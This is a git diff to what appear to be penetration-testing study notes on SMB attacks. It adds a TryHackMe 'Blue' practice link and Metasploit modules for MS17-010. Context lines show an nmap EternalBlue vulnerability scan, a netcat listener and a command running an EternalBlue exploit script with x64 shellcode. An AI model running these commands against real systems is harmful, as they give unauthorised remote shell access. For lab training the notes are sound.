@@ -31,6 +31,8 @@ msf > set SMBPass <password>
 ```
 
 ## EternalBlue
+- Practice with [Blue](https://tryhackme.com/room/blue)
+
 ```
 nmap -Pn -sV -p445 --script=smb-vuln-ms17-010 <ip>
 ```
@@ -51,8 +53,13 @@ y
 1
 1
 
-nc -nvlp <port> ==> another tab
+nc -nvlp <port>
 
 cd ..
 python eternalblue_exploit7.py <ip> shellcode/sc_x64.bin
+```
+
+```
+use auxiliary/scanner/smb/smb_ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
 ```
